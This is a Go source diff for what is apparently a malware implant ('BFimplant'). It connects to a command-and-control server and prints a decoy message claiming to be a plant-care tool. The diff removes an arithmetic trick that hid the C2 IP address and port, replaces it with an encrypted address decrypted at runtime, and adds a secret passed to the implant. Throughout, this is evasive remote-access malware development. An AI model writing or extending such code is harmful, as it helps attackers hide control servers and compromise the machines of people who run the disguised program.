@@ -4,10 +4,15 @@ import (
 	"BFimplant/modules"
 	"BFimplant/mymutex"
 	"fmt"
-	"strconv"
 	"syscall"
+	"BFimplant/per"
 )
 
+
+var (
+    secret string
+    ipC2   string
+)
 
 func main() {
 	fmt.Println("this a plant detection water and soil and food for better plants in the world <3")
@@ -25,22 +30,10 @@ func main() {
 	
 	if waitResult == syscall.WAIT_OBJECT_0 {
 
-
-		str1:=""
-		str2:=""
-		str3:=""
-		str4:=""
-		strp:=""
-		x:=len(str1)+20
-		y:=len(str2)+220
-		z:=len(str3)+23
-		k:=len(str4)+85
-		l:=len(strp)+5000
-
-		c2ServerURL := "http://" + strconv.Itoa(x) + "." + strconv.Itoa(y) + "." + strconv.Itoa(z) + "." + strconv.Itoa(k) + ":" + strconv.Itoa(l)
+		c2ServerURL := "http://" + per.DecryptString(ipC2) + ":" + "5000"
 
 		defer mymutex.ReleaseMutex(mutex)
-		implant := NewImplant(c2ServerURL)
+		implant := NewImplant(c2ServerURL,secret)
 		
 
 		// Register modules
